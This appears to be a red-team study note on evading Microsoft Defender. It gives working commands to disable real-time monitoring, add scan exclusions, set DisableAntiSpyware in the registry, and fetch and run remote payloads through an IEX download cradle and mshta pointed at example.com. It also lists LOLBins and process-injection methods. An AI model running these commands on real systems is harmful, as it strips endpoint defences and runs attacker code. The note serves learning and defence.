# 02 - Windows Defender Evasion (Windows Defense Evasion)

## Overview

Windows Defender Evasion refers to techniques used to bypass, disable, or reduce the effectiveness of Microsoft Defender and its security features. Attackers and red teamers may attempt to avoid detection by modifying Defender configurations, exploiting trust boundaries, or using execution methods that evade behavioral and signature-based detection.

---

## Windows Defender Architecture

Windows Defender is composed of several security components:

* Real-time Protection (file and process monitoring)
* Cloud-delivered Protection (online threat intelligence)
* Behavior Monitoring (heuristic detection)
* Anti-malware Scan Interface (AMSI integration)
* Controlled Folder Access (ransomware protection)
* Security Intelligence Updates

Defender is deeply integrated into Windows and cannot be easily removed in modern versions, but it can be configured or bypassed in limited ways.

---

## Common Windows Defender Evasion Techniques

### 1. Disabling Real-Time Protection (Where Permitted)

Attackers may attempt to reduce monitoring by disabling real-time scanning.

#### Example Commands (for awareness)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

```cmd
powershell Set-MpPreference -DisableRealtimeMonitoring 1
```

---

### 2. Adding Defender Exclusions

Exclusions can prevent files, folders, or processes from being scanned.

```powershell
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionProcess "malicious.exe"
Add-MpPreference -ExclusionExtension ".exe"
```

---

### 3. Tampering with Defender Settings via Registry

Some configurations can be modified through registry keys (requires admin privileges).

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

---

### 4. AMSI Bypass Concepts (Behavioral Evasion)

AMSI (Anti-Malware Scan Interface) is used to inspect scripts at runtime.

Attackers may attempt to:

* Modify AMSI scan results in memory
* Obfuscate PowerShell scripts
* Break script inspection flow

Example (conceptual PowerShell obfuscation):

```powershell
"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
```

---

### 5. Living Off The Land Execution (LOLBins)

Trusted Windows binaries may be used to avoid detection by application allowlisting systems.

Common examples:

* `rundll32.exe`
* `mshta.exe`
* `regsvr32.exe`
* `powershell.exe`
* `wmic.exe`

Example:

```cmd
mshta http://example.com/payload.hta
```

---

### 6. Process Injection (Conceptual Evasion)

Code is executed inside trusted processes to hide malicious activity.

Techniques include:

* DLL injection
* Process hollowing
* Remote thread execution